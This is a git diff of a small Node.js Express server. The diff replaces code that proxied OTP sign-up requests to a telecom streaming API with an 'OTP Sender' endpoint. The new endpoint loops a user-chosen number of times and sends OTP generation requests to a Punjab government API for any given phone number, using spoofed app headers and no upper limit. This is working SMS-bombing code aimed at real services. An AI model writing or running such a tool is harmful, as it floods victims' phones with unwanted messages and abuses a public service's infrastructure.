@@ -1,89 +1,62 @@
-const express = require('express');
-const fetch = require('node-fetch'); // npm install node-fetch@2
-const crypto = require('crypto');
-const { v4: uuidv4 } = require('uuid');
-const path = require('path');
+import express from "express";
+import bodyParser from "body-parser";
+import fetch from "node-fetch";
+import cors from "cors";
 
 const app = express();
-app.use(express.json());
+const PORT = 3000;
 
-// Serve static frontend files from 'frontend' folder
-app.use(express.static(path.join(__dirname, 'frontend')));
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static("public")); // serve index.html from 'public' folder
 
-// Serve homepage
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
-});
-
-// Send OTP endpoint
-app.post('/send-otp', async (req, res) => {
-  const { mobile } = req.body;
-  try {
-    const response = await fetch('https://jazztv.pk/alpha/api_gateway/index.php/v3/users-dbss/sign-up-wc', {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json;charset=UTF-8',
-        'Origin': 'http://portal.tamashaweb.com'
-      },
-      body: JSON.stringify({
-        from_screen: "signUp",
-        device: "web",
-        telco: "jazz",
-        device_id: "web",
-        is_header_enrichment: "no",
-        other_telco: "jazz",
-        mobile,
-        phone_details: "web"
-      })
-    });
-    const data = await response.json();
-    if(data.code == 200 && data.eData) {
-      res.json({ success: true, user_id: data.user_id });
-    } else {
-      res.json({ success: false, message: data.message || "Failed to send OTP" });
-    }
-  } catch (err) {
-    res.json({ success: false, message: err.message });
+// Convert local 03xxxxxxxxx to 923xxxxxxxxx format
+function formatMobile(number) {
+  if(number.startsWith("03") && number.length === 11){
+    return "92" + number.slice(1);
   }
-});
+  return number; // assume already in full format
+}
 
-// Verify OTP endpoint
-app.post('/verify-otp', async (req, res) => {
-  const { mobile, otp, user_id } = req.body;
-  const salt = crypto.randomBytes(8).toString('hex');
-  const uuid = uuidv4();
+// Endpoint to send OTP
+app.post("/send-otp", async (req, res) => {
+  let { mobile_number, count } = req.body;
+  mobile_number = formatMobile(mobile_number);
 
-  try {
-    const response = await fetch('https://jazztv.pk/alpha/api_gateway/index.php/v3/users-dbss/authentication-wc', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'http://portal.tamashaweb.com' },
-      body: JSON.stringify({
-        type: "prepaid",
-        otpId: "",
-        phone_details: "web",
-        code: otp,
-        telco: "jazz",
-        service_class: "16",
-        other_telco: "jazz",
-        mobile,
-        user_id,
-        device_id: "web",
-        is_jazz_user: "yes",
-        opId: 0,
-        salt,
-        uuid
-      })
-    });
-    const data = await response.json();
-    if(data.code == 200) {
-      res.json({ success: true });
-    } else {
-      res.json({ success: false, message: data.message || "OTP verification failed" });
-    }
-  } catch (err) {
-    res.json({ success: false, message: err.message });
+  if (!mobile_number.match(/^92\d{10}$/)) {
+    return res.json({ status: false, message: "Invalid mobile number" });
   }
+
+  const otpCount = count && count > 0 ? count : 1;
+  const results = [];
+
+  for (let i = 1; i <= otpCount; i++) {
+    try {
+      const response = await fetch("https://e-epd.punjab.gov.pk/api/sns_generate_mobile_otp", {
+        method: "POST",
+        headers: {
+          "app": "sans",
+          "version": "34",
+          "Content-Type": "application/json",
+          "User-Agent": "okhttp/4.5.0"
+        },
+        body: JSON.stringify({ mobile_number })
+      });
+
+      const data = await response.json();
+      results.push({ attempt: i, response: data });
+
+      // 1-second delay between requests
+      if (i < otpCount) await new Promise(r => setTimeout(r, 1000));
+
+    } catch (err) {
+      results.push({ attempt: i, error: err.message });
+    }
+  }
+
+  res.json({ status: true, results });
 });
 
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
+app.listen(PORT, () => {
+  console.log(`OTP Sender server running at http://localhost:${PORT}`);
+});
